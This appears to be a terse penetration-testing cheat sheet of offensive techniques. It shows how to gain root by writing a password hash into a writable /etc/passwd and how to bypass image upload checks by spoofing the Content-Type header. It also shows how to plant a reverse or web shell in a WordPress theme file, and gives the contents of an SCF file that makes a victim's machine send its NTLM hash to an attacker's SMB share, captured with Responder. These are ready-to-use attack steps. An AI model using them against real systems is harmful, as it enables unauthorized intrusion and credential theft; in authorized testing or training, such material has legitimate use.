
# /etc/passwd Writable

Insert Root Password Hash
```
openssl passwd passwordofchoice

Note: The extra steps below are precautionary instead of edit in place.
cp /etc/passwd /tmp/passwd.orig
cp /etc/passwd /tmp/passwd

vi /tmp/passwd
root:generatedhash:0:0:root:/root:/bin/bash

cp /tmp/passwd /etc/passwd
```

# File Upload Bypass

## Image Upload Bypass

Change the Content-Type Header to the Expected Type
`Content-Type: image/jpeg`

# HTTP

## WordPress

Edit an active template page (e.g., 404.php) to execute a reverse shell or web shell to send a reverse shell.
```
Appearance > Editor > page.php

Execute the file:
http://target/wordpress/wp-content/themes/themenamenospaces/page.php
```

# SMB

SCF (Shell Command Files)

```
Start responder: sudo responder -v -I interface

(Note: Filename starts with @ to bring file to top of directory listing)
Contents of @test.scf:

[Shell]
Command=2
IconFile=\\attacker\share\test.ico
[Taskbar]
Command=ToggleDesktop

Deliver file.

When user opens file, an SMB connection will be made to the attacker, which should be captured by responder, revealing an NTLM hash.
```